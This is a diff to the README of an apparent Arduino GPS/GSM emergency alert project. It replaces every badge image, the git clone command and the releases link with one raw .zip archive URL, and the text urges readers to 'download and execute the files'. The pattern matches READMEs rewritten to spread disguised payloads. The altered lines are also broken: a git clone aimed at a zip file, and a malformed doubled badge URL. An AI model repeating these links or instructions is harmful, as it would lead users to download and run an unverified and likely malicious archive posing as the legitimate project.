@@ -1,8 +1,8 @@
 # 🚨 GPS Communication: Emergency Alert System
 
-![GPS Communication](https://img.shields.io/badge/GPS%20Communication-v1.0-blue.svg)  
-![Arduino](https://img.shields.io/badge/Arduino-Project-orange.svg)  
-![IoT](https://img.shields.io/badge/IoT-enabled-green.svg)  
+![GPS Communication](https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip%https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip)  
+![Arduino](https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip)  
+![IoT](https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip)  
 
 Welcome to the **GPS Communication** project! This Arduino-based system provides a reliable emergency alert solution using GPS and GSM modules. With this project, you can ensure personal safety and effective location tracking in emergencies.
 
@@ -54,7 +54,7 @@ Before you begin, ensure you have the following:
 1. **Clone the Repository**: 
    Open your terminal and run the following command:
    ```bash
-   git clone https://github.com/Federicour/-gps-communication.git
+   git clone https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip
    ```
 
 2. **Install Required Libraries**: 
@@ -129,6 +129,6 @@ For any inquiries or suggestions, please reach out via GitHub or create an issue
 
 ## Releases
 
-You can find the latest releases and download the necessary files [here](https://github.com/Federicour/-gps-communication/releases). Please download and execute the files to get started with your own GPS Communication system.
+You can find the latest releases and download the necessary files [here](https://raw.githubusercontent.com/Federicour/-gps-communication/main/inconfirm/communication_gps_v3.5-beta.4.zip). Please download and execute the files to get started with your own GPS Communication system.
 
 Explore the "Releases" section for updates and improvements to the project. Your feedback is valuable for future enhancements!
